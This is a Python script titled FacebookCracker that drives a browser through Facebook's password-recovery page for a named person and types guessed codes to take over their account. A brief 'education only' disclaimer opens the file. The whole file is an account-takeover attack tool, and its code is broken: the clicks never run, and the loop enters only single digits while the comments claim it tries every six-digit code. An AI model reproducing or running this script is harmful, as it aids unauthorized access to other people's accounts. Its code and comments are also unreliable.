"""
    NOTICE: This program was made solely for education and entertainment
    purposes, the developer is not responsible for any illegal or unauthorized
    use of this program.
"""
import urllib2
import itertools
from selenium import webdriver
from selenium.common.exceptions import NoSuchElementException
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import TimeoutException
from selenium.webdriver.support.ui import WebDriverWait
from bs4 import BeautifulSoup

class FacebookCracker(object):
  def __init__(self):
    self.InitFacebook('Enter full name of person')

  def InitFacebook(self, fname):
    #setting up an index for later
    e=0
    #initializing selenium web driver
    #you can easily change the driver to chrome or whichever you like
    driver = webdriver.Firefox()
    driver.get('https://www.facebook.com/login/identify?ctx=recover')
    #Enters in persons name
    inputElement = driver.find_element_by_id("identify_email")
    inputElement.send_keys(fname)
    WebDriverWait(driver, 4)
    #presses enter
    inputElement.send_keys(Keys.ENTER)
    #Clicks button to select person--Unless specified otherwise, will select first person
    btnElement = driver.find_element_by_class_name("uiButton")
    btnElement.click
    WebDriverWait(driver, 7)
    #Selects radio element for phone--if phone is not
    #connected it will select email and this will not work
    radElement = driver.find_element_by_id("u_0_1")
    radElement.click
    WebDriverWait(driver, 10)
    #Presses enter on the "a"
    btnElement2 = driver.find_element_by_id("u_0_2")
    btnElement2.click
    #Finds the input element
    inputElement2 = driver.find_element_by_class_name("inputtext")
    #List that holds starter lists to find permutations for
    numberPerms = [['0', '1', '2', '3', '4', '5'],['1','2','3','4','5','6'],['2','3','4','5','6','7'],['3','4','5','6','7','8'],['4','5','6','7','8','9'],['5','6','7','8','9','0'],['6','7','8','9','0','1'],['7','8','9','0','1','2'],['8','9','0','1','2','3'],['9','0','1','2','3','4']]

    #Runs every possible permutation from list above, creating every possible
    #6 digit combination
    for i in numberPerms:
        for p in numberPerms[e]:
            theStr = ''.join(map(str, p))
            inputElement3 = driver.find_element_by_class_name("inputtext")
            inputElement3.send_keys(theStr)
            inputElement3.send_keys(Keys.ENTER)
        e=e+1
#Initializing class
if __name__ == '__main__':
    fbook = FacebookCracker()
